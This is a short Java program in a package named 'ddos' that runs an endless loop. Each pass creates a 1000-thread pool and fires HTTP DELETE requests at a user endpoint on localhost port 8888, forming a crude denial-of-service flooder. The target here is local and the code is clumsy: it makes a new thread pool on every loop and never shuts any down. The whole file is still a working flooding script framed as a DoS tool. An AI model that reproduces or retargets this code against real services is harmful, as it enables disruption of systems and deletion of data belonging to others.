/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ddos;

import com.sun.corba.se.spi.orbutil.threadpool.ThreadPool;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 *
 * @author Tudor
 */
public class Ddos {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        // TODO code application logic here
       

        while (true) {
             ExecutorService es =  Executors.newFixedThreadPool(1000);
            Runnable th = new SendRequest();
            es.execute(th);
          
        }
    }
    
    private static class SendRequest implements Runnable {

        @Override
        public void run() {
            executePost("http://localhost:8888/v1/users/4");
        }
        
    }
    
    public static void executePost(String targetURL) {
        HttpURLConnection connection = null;
        
  try {
    //Create connection
    URL url = new URL(targetURL);
    connection = (HttpURLConnection) url.openConnection();
    connection.setRequestMethod("DELETE");
    connection.setRequestProperty("Content-Type", 
        "application/x-www-form-urlencoded");

//    connection.setRequestProperty("Content-Length", 
//        Integer.toString(urlParameters.getBytes().length));
    connection.setRequestProperty("Content-Language", "en-US");  

    connection.setUseCaches(false);
    connection.setDoOutput(true);

    //Send request
      DataOutputStream wr = new DataOutputStream (
        connection.getOutputStream());
//    wr.writeBytes(urlParameters);
    wr.close();

    //Get Response  
      InputStream is = connection.getInputStream();
      BufferedReader rd = new BufferedReader(new InputStreamReader(is));
    StringBuilder response = new StringBuilder(); // or StringBuffer if Java version 5+
    String line;
    while ((line = rd.readLine()) != null) {
      response.append(line);
      response.append('\r');
    }
    rd.close();
 
  }
  catch (Exception e) {
    e.printStackTrace();
   
  } 
    }
    
}
